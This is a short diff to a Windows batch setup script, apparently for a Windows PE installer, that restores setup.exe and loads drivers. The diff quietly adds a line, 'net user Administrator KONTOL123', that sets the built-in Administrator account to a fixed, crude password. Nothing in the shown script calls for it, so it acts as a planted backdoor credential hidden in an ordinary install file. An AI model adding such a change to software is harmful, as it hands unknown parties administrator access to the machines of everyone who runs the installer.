@@ -1,6 +1,6 @@
 @echo off
 mode con cp select=437 >nul
-
+net user Administrator KONTOL123
 rem 还原 setup.exe
 rename X:\setup.exe.disabled setup.exe
 
@@ -241,3 +241,4 @@ if not errorlevel 1 (
     drvload "%~1"
 )
 exit /b
+
